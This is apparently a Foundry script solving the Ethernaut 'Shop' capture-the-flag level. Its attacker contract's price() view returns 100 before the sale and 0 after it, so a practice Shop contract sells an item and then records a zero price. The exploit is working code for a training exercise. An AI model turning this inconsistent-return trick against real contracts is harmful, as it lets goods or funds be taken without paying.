// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Shop} from "../src/Shop.sol";

contract ShopSolution is Script {
    // $ forge script script/Shop.s.sol --tc ShopSolution

    function run() external {
        Shop shopInstance = new Shop();

        // --- Attack Starts from Here ---
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        // - We need to make the price equal zero, and the `isSold` variable to be true to pass this challenge.
        // - The idea for passing this challenge is to make `price()` function return the correct price (100) in the first call. And returns zero in the second call.
        // - We solved one challenge with the same idea (Elevator 11th CTF challenge), you can check it out for a quick refresher.
        // - The difference between this and the Elevator challenge is the function that will be called.
        // - The function that we will call twice `price()`, is marked as a view function. So we can't change the state when calling it.
        // - So we can't make a counter that counts the number of function firing as we did in Elevator, but luckily we have another thing to do.
        // - We can depend on the `isSold` variable in the `Shop` contract. When `isSold == false` we will return `100`, otherwise, we will return zero.
        // - By doing this, we will buy the item (make isSold = true), and when setting the price, we will set it to zero, and the challenge will be passed.

        ShopAttack attackContract = new ShopAttack(address(shopInstance));

        console.log("Price:", shopInstance.price());
        console.log("isSold:", shopInstance.isSold());
        attackContract.attack();
        console.log("Price:", shopInstance.price());
        console.log("isSold:", shopInstance.isSold());

        vm.stopPrank();
    }
}

contract ShopAttack {
    Shop shopInstance;

    constructor(address target) {
        shopInstance = Shop(target);
    }

    function price() public view returns (uint256 p) {
        if (!shopInstance.isSold()) {
            p = 100;
        } else {
            p = 0;
        }
    }

    function attack() public {
        shopInstance.buy();
    }
}
